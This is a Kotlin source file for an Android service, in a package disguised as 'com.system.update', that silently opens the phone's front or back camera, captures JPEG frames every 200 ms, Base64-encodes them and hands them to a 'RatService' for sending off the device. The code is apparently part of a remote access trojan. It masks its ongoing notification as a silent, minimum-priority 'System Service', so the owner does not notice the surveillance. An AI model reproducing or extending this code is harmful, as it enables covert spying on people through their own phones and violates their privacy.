package com.system.update

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.nio.ByteBuffer

class CameraStreamService : Service() {

    companion object {
        const val TAG = "CameraStream"
        const val NOTIF_ID = 200
        @Volatile var isStreaming: Boolean = false
        @Volatile var isFront: Boolean = false
        @Volatile var intervalMs: Long = 200L
    }

    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private val cm by lazy { getSystemService(Context.CAMERA_SERVICE) as CameraManager }
    private var running = false
    private var frameCount = 0

    private fun slog(msg: String) {
        Log.i(TAG, msg)
        RatService.instance?.sendLog(TAG, msg)
    }
    private fun elog(msg: String) {
        Log.e(TAG, msg)
        RatService.instance?.sendLog(TAG, "ERR: $msg")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val front = intent?.getBooleanExtra("front", false) ?: false
        val interval = intent?.getLongExtra("interval", 200L) ?: 200L

        slog("onStartCommand front=$front")

        // WAJIB: foreground DULU, sebelum apapun
        startForeground(NOTIF_ID, buildNotification())

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            elog("CAMERA PERMISSION NOT GRANTED")
            stopSelf()
            return START_NOT_STICKY
        }

        if (isStreaming) {
            slog("Already streaming — restart")
            stopSelf()
            return START_NOT_STICKY
        }

        isFront = front
        intervalMs = interval
        isStreaming = true
        running = true
        frameCount = 0

        startStreaming()
        return START_NOT_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }

    @SuppressLint("MissingPermission")
    private fun startStreaming() {
        try {
            val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT
                               else CameraCharacteristics.LENS_FACING_BACK

            val cameraId = cm.cameraIdList.firstOrNull { id ->
                cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: cm.cameraIdList.firstOrNull() ?: run {
                elog("No camera available")
                stopSelf()
                return
            }

            slog("Using cameraId=$cameraId")

            thread = HandlerThread("cam_stream").also { it.start() }
            handler = Handler(thread!!.looper)

            val chars = cm.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)
                ?.filter { it.width <= 640 && it.height <= 640 }
                ?.maxByOrNull { it.width * it.height }
                ?: Size(480, 360)

            slog("Frame size ${size.width}x${size.height}")

            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)

            imageReader!!.setOnImageAvailableListener({ r ->
                val image = try { r.acquireLatestImage() } catch (_: Exception) { null }
                if (image != null) {
                    try {
                        val buf: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)

                        frameCount++
                        val sent = RatService.instance?.sendFrame(
                            if (isFront) "cam_front_frame" else "cam_back_frame",
                            b64
                        ) ?: false

                        if (frameCount % 20 == 0) {
                            slog("Frame #$frameCount sent=$sent size=${b64.length}")
                        }
                    } catch (e: Exception) {
                        elog("Encode error: ${e.message}")
                    } finally {
                        try { image.close() } catch (_: Exception) {}
                    }
                }
            }, handler)

            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    slog("Camera opened")
                    cameraDevice = camera
                    startCaptureLoop()
                }
                override fun onDisconnected(camera: CameraDevice) {
                    slog("Camera disconnected")
                    camera.close()
                    stopSelf()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    elog("Camera error code=$error")
                    camera.close()
                    stopSelf()
                }
            }, handler)

        } catch (e: Exception) {
            elog("startStreaming exception: ${e.message}")
            stopSelf()
        }
    }

    private fun startCaptureLoop() {
        try {
            val camera = cameraDevice ?: return
            val reader = imageReader ?: return
            @Suppress("DEPRECATION")
            camera.createCaptureSession(
                listOf(reader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        slog("Session configured")
                        session = s
                        loopCapture()
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {
                        elog("Session config failed")
                        stopSelf()
                    }
                },
                handler
            )
        } catch (e: Exception) {
            elog("startCaptureLoop exception: ${e.message}")
        }
    }

    private fun loopCapture() {
        if (!running) return
        try {
            val camera = cameraDevice ?: return
            val s = session ?: return
            val reader = imageReader ?: return
            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                addTarget(reader.surface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                set(CaptureRequest.JPEG_QUALITY, 45.toByte())
            }
            s.capture(req.build(), null, handler)
            handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
        } catch (e: Exception) {
            elog("loopCapture exception: ${e.message}")
        }
    }

    override fun onDestroy() {
        slog("onDestroy — frames=$frameCount")
        running = false
        isStreaming = false
        try { session?.close() } catch (_: Exception) {}
        try { cameraDevice?.close() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        try { thread?.quitSafely() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}